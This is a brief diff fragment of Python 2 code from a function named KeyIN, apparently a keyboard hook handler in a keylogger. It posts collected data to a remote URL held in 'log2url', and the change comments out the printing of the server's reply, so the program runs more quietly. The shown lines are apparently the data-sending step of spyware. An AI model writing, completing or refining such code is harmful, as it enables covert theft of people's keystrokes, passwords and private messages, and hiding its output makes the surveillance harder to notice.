@@ -72,7 +72,7 @@ def KeyIN(event):
 	req = urllib2.Request(log2url, data)
 	response = urllib2.urlopen(req)
 	the_page = response.read()
-	print the_page
+	#print the_page
 
 	# Return to hook
 	return True
